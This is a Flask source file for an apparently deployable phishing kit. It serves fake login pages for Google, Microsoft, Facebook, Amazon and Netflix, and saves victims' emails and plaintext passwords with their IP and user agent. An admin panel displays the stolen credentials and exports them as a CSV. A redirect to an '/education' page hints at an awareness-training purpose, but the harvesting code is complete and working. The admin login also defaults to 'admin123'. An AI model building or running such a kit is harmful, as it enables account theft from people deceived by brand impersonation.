from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import datetime
import os
import json
import sys
import subprocess
from dotenv import load_dotenv
import asyncio
from functools import wraps

# Load environment variables
load_dotenv()

# Apply nest_asyncio for better asyncio support
import nest_asyncio
nest_asyncio.apply()

# Handle Prisma import with error handling
try:
    from prisma import Prisma
except ImportError:
    print("Prisma client not found, attempting to generate...")
    try:
        subprocess.check_call(["python", "-m", "pip", "install", "prisma", "--upgrade"])
        subprocess.check_call(["python", "-m", "prisma", "generate"])
        from prisma import Prisma
        print("Prisma client generated successfully.")
    except Exception as e:
        print(f"Error generating Prisma client: {e}")
        raise

app = Flask(__name__)
app.secret_key = os.getenv('SECRET_KEY', 'fallback-secret-key-change-in-production')

# Initialize Prisma client
db = Prisma()

def async_route(f):
    """Decorator to handle async routes in Flask"""
    @wraps(f)
    def wrapper(*args, **kwargs):
        return asyncio.run(f(*args, **kwargs))
    return wrapper

async def ensure_connected():
    """Ensure database is connected with retry logic"""
    max_retries = 5  # Increased retries
    for attempt in range(max_retries):
        try:
            # Always disconnect first in serverless environment
            try:
                if db.is_connected():
                    await db.disconnect()
            except Exception:
                pass  # Ignore disconnect errors
                
            # Check if DATABASE_URL is set
            db_url = os.getenv('DATABASE_URL')
            if not db_url:
                raise Exception("DATABASE_URL environment variable is not set")
                
            # Connect with explicit timeout
            await asyncio.wait_for(db.connect(), timeout=5.0)
            print(f"Database connected successfully on attempt {attempt + 1}")
            return
        except Exception as e:
            print(f"Database connection attempt {attempt + 1} failed: {e}")
            if attempt == max_retries - 1:
                raise
            await asyncio.sleep(1)

async def get_stats():
    """Calculate real statistics from database"""
    await ensure_connected()
    
    try:
        # Get total attempts
        total_attempts = await db.capture.count()
        
        # Get unique IPs
        unique_ips_result = await db.query_raw(
            "SELECT COUNT(DISTINCT ip) as count FROM captures"
        )
        unique_ips = unique_ips_result[0]['count'] if unique_ips_result else 0
        
        # Get today's attempts
        today = datetime.datetime.now().date()
        today_attempts = await db.capture.count(
            where={
                'timestamp': {
                    'gte': datetime.datetime.combine(today, datetime.time.min),
                    'lte': datetime.datetime.combine(today, datetime.time.max)
                }
            }
        )
        
        stats = {
            'total_attempts': total_attempts,
            'success_rate': 100 if total_attempts > 0 else 0,
            'unique_ips': unique_ips,
            'today_attempts': today_attempts
        }
        
        return stats
        
    except Exception as e:
        print(f"Error calculating stats: {e}")
        return {
            'total_attempts': 0,
            'success_rate': 0,
            'unique_ips': 0,
            'today_attempts': 0
        }

@app.route('/', methods=['GET', 'POST'])
@async_route
async def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        browser_data = request.form.get('browserData', '')
        ip = request.remote_addr or 'unknown'
        
        # Parse browser data if available
        user_agent = ''
        if browser_data:
            try:
                browser_info = json.loads(browser_data)
                user_agent = browser_info.get('userAgent', '')
            except:
                pass
        
        # Save to database
        await ensure_connected()
        try:
            await db.capture.create(
                data={
                    'email': email,
                    'password': password,
                    'ip': ip,
                    'userAgent': user_agent,
                    'template': 'google'
                }
            )
        except Exception as e:
            print(f"Error saving capture: {e}")
        
        return redirect(url_for('education'))
    
    return render_template('login.html')

@app.route('/education')
def education():
    return render_template('education.html')

@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        admin_username = os.getenv('ADMIN_USERNAME', 'admin')
        admin_password = os.getenv('ADMIN_PASSWORD', 'admin123')
        
        if username == admin_username and password == admin_password:
            session['logged_in'] = True
            return redirect(url_for('admin'))
        else:
            error = 'Invalid credentials'
    return render_template('admin_login.html', error=error)

@app.route('/admin')
@async_route
async def admin():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    await ensure_connected()
    
    try:
        # Get all captures ordered by newest first
        captures = await db.capture.find_many(
            order={
                'timestamp': 'desc'
            }
        )
        
        # Format data for template
        data = []
        for capture in captures:
            user_agent = capture.userAgent or 'Unknown'
            # Truncate long user agents for display
            if len(user_agent) > 50:
                user_agent = user_agent[:50] + '...'
            
            data.append([
                capture.email,
                capture.password,
                capture.ip,
                capture.timestamp.strftime("%Y-%m-%d %H:%M:%S"),
                user_agent
            ])
        
        # Get statistics
        stats = await get_stats()
        
        return render_template('admin.html', data=data, stats=stats)
        
    except Exception as e:
        print(f"Error loading admin data: {e}")
        return render_template('admin.html', data=[], stats={
            'total_attempts': 0,
            'success_rate': 0,
            'unique_ips': 0,
            'today_attempts': 0
        })

@app.route('/admin/clear_data', methods=['POST'])
@async_route
async def clear_data():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    await ensure_connected()
    
    try:
        await db.capture.delete_many()
        print("All capture data cleared")
    except Exception as e:
        print(f"Error clearing data: {e}")
    
    return redirect(url_for('admin'))

@app.route('/admin/export')
@async_route
async def export_data():
    if not session.get('logged_in'):
        return redirect(url_for('admin_login'))
    
    await ensure_connected()
    
    try:
        captures = await db.capture.find_many(
            order={
                'timestamp': 'desc'
            }
        )
        
        # Create CSV data
        csv_data = "Email,Password,IP Address,Timestamp,User Agent,Template\n"
        for capture in captures:
            csv_data += f'"{capture.email}","{capture.password}","{capture.ip}","{capture.timestamp}","{capture.userAgent or "Unknown"}","{capture.template or "Unknown"}"\n'
        
        response = app.response_class(
            csv_data,
            mimetype='text/csv',
            headers={
                'Content-Disposition': f'attachment; filename=phishing_data_{datetime.datetime.now().strftime("%Y%m%d_%H%M%S")}.csv'
            }
        )
        return response
        
    except Exception as e:
        print(f"Error exporting data: {e}")
        return redirect(url_for('admin'))

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('admin_login'))

@app.route('/template/<template_name>', methods=['GET', 'POST'])
@async_route
async def phishing_template(template_name):
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        browser_data = request.form.get('browserData', '')
        ip = request.remote_addr or 'unknown'
        
        # Parse browser data if available
        user_agent = ''
        if browser_data:
            try:
                browser_info = json.loads(browser_data)
                user_agent = browser_info.get('userAgent', '')
            except:
                pass
        
        # Save to database
        await ensure_connected()
        try:
            await db.capture.create(
                data={
                    'email': email,
                    'password': password,
                    'ip': ip,
                    'userAgent': user_agent,
                    'template': template_name
                }
            )
        except Exception as e:
            print(f"Error saving capture: {e}")
        
        return redirect(url_for('education'))
    
    templates = {
        'google': 'login.html',
        'microsoft': 'microsoft_login.html',
        'facebook': 'facebook_login.html',
        'amazon': 'amazon_login.html',
        'netflix': 'netflix_login.html'
    }
    
    if template_name in templates:
        return render_template(templates[template_name])
    else:
        return redirect(url_for('login'))

@app.route('/api/stats')
@async_route
async def api_stats():
    """API endpoint for live statistics"""
    if not session.get('logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    
    stats = await get_stats()
    return jsonify(stats)

# Health check for Vercel
@app.route('/health')
@async_route
async def health():
    try:
        await ensure_connected()
        db_status = "connected"
    except Exception as e:
        db_status = f"error: {str(e)}"
    
    # Get environment variables (with sensitive parts masked)
    env_vars = {}
    for key in ['VERCEL_ENV', 'VERCEL_REGION', 'PYTHON_VERSION', 'NODE_VERSION']:
        env_vars[key] = os.environ.get(key, 'not set')
        
    # Check DATABASE_URL (but don't reveal password)
    db_url = os.environ.get('DATABASE_URL', 'not set')
    if db_url != 'not set':
        # Replace password with asterisks
        import re
        masked_url = re.sub(r'(postgresql://[^:]+:)[^@]+(@.+)', r'\1*****\2', db_url)
        env_vars['DATABASE_URL'] = masked_url
    
    # Check other environment variables existence
    for key in ['SECRET_KEY', 'ADMIN_USERNAME', 'ADMIN_PASSWORD']:
        env_vars[f"{key}_set"] = 'yes' if os.environ.get(key) else 'no'
    
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.datetime.now().isoformat(),
        'database_status': db_status,
        'python_version': '.'.join(map(str, sys.version_info[:3])),
        'environment': env_vars,
        'prisma_version': os.environ.get('PRISMA_VERSION', 'unknown')
    })

# Export the Flask app for Vercel
application = app

if __name__ == '__main__':
    app.run(debug=True)
